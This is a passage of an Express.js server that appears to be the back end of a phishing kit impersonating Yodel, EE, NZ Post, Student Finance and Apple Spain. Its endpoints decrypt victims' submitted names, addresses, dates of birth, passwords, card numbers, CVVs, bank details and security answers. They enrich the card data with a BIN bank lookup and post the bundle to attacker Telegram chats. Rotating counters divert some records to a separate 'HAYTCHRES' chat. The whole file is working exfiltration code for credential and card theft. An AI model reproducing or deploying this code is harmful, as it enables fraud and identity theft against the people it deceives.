          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1367138150&text=Yodel:\n${originalText}`
        );
        bill += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/sendKelvYodelRes", cors());

let kelvCount = 0;

app.post("/sendKelvYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Yodel:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//EE
//EE
//EE

app.options("/c2EE", cors());

app.post("/c2EE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EEC2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5348269876,
              text: `EE:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/eeKelv", cors());

app.post("/eeKelv", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 5) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EEKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=EE:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

//NZPOST
//NZPOST
//NZPOST

app.options("/nzpostFirst", cors());

app.post("/nzpostFirst", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;

      if (mason == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        mason = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `NZPostFred:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5111234111,
              text: `NZPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        mason += 1;
      }
    });

  res.send("Update Complete");
});

//SFE
//SFE
//SFE

let bandz = 0;

app.options("/chopsSFE", cors());

app.post("/chopsSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (bandz == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEbandz:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 990604907,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz += 1;
  }
  res.send("Update Complete");
});

app.options("/bandzSFE", cors());

app.post("/bandzSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (bandz == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEbandz:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 5752146124,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    bandz += 1;
  }
  res.send("Update Complete");
});

let richgame = 0;

app.options("/richgameSFE", cors());

app.post("/richgameSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (richgame == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    richgame = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFERichGame:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 759000656,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    richgame += 1;
  }
  res.send("Update Complete");
});

let jv = 0;

app.options("/cypherSFE", cors());

app.post("/cypherSFE", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (jv == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEJV:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1002430657,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv += 1;
  }
  res.send("Update Complete");
});

app.options("/sfeJV", cors());

app.post("/sfeJV", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (jv == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEJV:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1435332919,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    jv += 1;
  }
  res.send("Update Complete");
});

app.options("/sfeNBA", cors());

app.post("/sfeNBA", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (chasingfunds == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEChasing:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 1778408628,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds += 1;
  }
  res.send("Update Complete");
});

app.options("/sfeChasing", cors());

app.post("/sfeChasing", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
    CryptoJS.enc.Utf8
  );

  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;

  if (chasingfunds == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds = 4;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `SFEChasing:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 864072421,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 969827191,
          text: `SFE:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    chasingfunds += 1;
  }
  res.send("Update Complete");
});

//APPLE ES
//APPLE ES
//APPLE ES

app.options("/kelvAppleSpain", cors());

app.post("/kelvAppleSpain", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
